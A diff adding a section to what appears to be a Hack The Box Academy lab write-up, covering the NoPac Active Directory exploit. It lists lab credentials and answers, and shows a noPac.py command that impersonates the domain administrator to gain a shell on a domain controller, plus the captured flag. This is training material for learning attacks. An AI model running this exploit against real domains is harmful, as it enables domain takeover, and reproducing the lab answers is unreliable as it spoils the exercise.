@@ -797,3 +797,31 @@ Using the same RAW Query we executed earlier, we can identify the hosts that the
 
 [![Screenshot-2025-03-21-093743.png](https://i.postimg.cc/T2KdQHRz/Screenshot-2025-03-21-093743.png)](https://postimg.cc/kDdPgsRs)
 
+
+## Bleeding Edge Vulnerabilities
+
+> SSH to 10.129.137.121 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
+ * **Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)**
+
+Answer: 2021-42278&2021-42287
+
+   
+>Authenticate to 10.129.137.121 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"**
+
+* **Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop**
+
+I started by connecting to the target system via SSH. The machine's IP was 10.129.137.121 (hostname ACADEMY-EA-ATTACK01). I logged in using the provided credentials.
+Once connected, I leveraged the NoPac exploit to escalate privileges and impersonate the domain administrator.
+
+I ran the following command:
+```c
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+```
+The exploit successfully provided a semi-interactive shell with elevated privileges.
+
+From the shell, I navigated to the Administrator's desktop and retrieved the flag:
+```c
+C:\Windows\system32> type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
+D0ntSl@ckonN0P@c!
+```
